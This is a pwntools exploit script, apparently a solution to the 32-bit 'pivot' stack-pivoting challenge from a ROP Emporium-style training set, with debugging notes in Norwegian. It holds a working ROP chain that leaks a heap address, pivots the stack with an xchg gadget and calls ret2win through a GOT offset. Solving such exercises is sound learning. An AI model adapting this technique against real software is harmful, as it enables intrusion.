#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./pivot32")
lib = ELF("./libpivot32.so")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]
rop = ROP(exe)
# context.log_level = "debug"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
# break main
# break *pwnme+198
break *foothold_function+42
# break *0x08048801
break *0x08048814
# break *0x080487b7
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
# io = start()
# io.sendline(cyclic(100, alphabet="QWERT"))
# io.wait()

# offset = cyclic_find(io.corefile.eip, alphabet="QWERT")
# info(offset)

io = start()

io.recvuntil(b"pivot: ")
heapAddress = int(io.recvuntil(b"\n").decode(), 16)
info("Heap address: %#x", heapAddress)

ret2win = lib.symbols["ret2win"]
foothold_function = lib.symbols["foothold_function"]
puts = exe.symbols["puts"]
xchg_esp_eax = 0x0804882E
pop_eax = rop.find_gadget(["pop eax", "ret"])[0]
call_eax = 0x080485F0
add_eax_ebx = 0x08048833
pop_ebx = 0x080484A9
mov_eax_dword_eax = (
    0x08048830  # den skriver addressa som eax peker til til registry eax
)


offset = 44

chain = flat(
    exe.symbols["foothold_function"],
    pop_eax,
    exe.symbols["got.foothold_function"],
    mov_eax_dword_eax,
    pop_ebx,
    ret2win - foothold_function,
    add_eax_ebx,
    call_eax,
)
io.recvuntil(b"> ")
io.sendline(chain)

stackSmash = flat(asm("nop") * offset, pop_eax, heapAddress, xchg_esp_eax)

io.recvuntil(b"> ")
io.sendline(stackSmash)

io.recvuntil(b"you!\n")
io.recvline()
io.interactive()

# BUG: Går an å hoppe tilbake til main og leake foothold_function
# got addresse med puts, men det er litt janky ettersom noe av input blir
# tatt inn fakka pga read elns.

# leakedFoothold_function = io.unpack()
# info(f"foothold_function: {hex(leakedFoothold_function)}")
# ret2win = leakedFoothold_function - foothold_function + ret2win
# info(f"ret2win: {hex(ret2win)}")

# payload = flat(asm("nop") * offset, ret2win, 0x0)

# io.recvuntil(b"pivot: ")
# heapAddress = int(io.recvuntil(b"\n").decode(), 16)
# info("Heap address: %#x", heapAddress)

# io.recvuntil(b"> ")
# io.sendline(payload)
# # io.recvuntil(b"> ")
# # io.sendline(payload)
# # print(io.recvall())

# io.interactive()

# print(io.recvall())

# io.interactive()

# 0x0804882c <+0>:	pop    eax
# 0x0804882d <+1>:	ret
# 0x0804882e <+2>:	xchg   esp,eax
# 0x0804882f <+3>:	ret
# 0x08048830 <+4>:	mov    eax,DWORD PTR [eax]
# 0x08048832 <+6>:	ret
# 0x08048833 <+7>:	add    eax,ebx
# 0x08048835 <+9>:	ret
# 0x08048836 <+10>:	xchg   ax,ax
# 0x08048838 <+12>:	xchg   ax,ax
# 0x0804883a <+14>:	xchg   ax,ax
# 0x0804883c <+16>:	xchg   ax,ax
# 0x0804883e <+18>:	xchg   ax,ax
